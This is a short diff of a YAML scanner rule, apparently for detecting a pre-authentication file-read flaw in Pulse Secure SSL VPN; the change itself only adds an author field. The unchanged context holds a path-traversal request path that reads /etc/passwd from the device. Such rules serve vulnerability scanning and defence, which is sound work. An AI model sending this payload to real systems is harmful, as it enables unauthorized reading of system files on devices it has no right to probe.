@@ -9,3 +9,4 @@ rules:
 detail:
   description: pulse-sslvpn preauth
   vulnpath: /dana-na/../dana/html5acc/guacamole/../../../../../../../etc/passwd?/dana/html5acc/guacamole/
+  author: w3bdoge
